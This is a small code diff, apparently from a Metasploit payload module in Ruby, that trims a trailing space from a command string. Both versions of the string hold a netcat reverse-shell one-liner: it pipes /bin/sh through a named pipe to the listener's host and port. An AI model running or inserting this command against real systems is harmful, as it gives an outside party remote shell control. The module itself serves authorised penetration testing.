@@ -51,6 +51,6 @@ module MetasploitModule
   #
   def command_string
     backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
-    "mkfifo /tmp/#{backpipe}; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe} "
+    "mkfifo /tmp/#{backpipe}; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
   end
 end
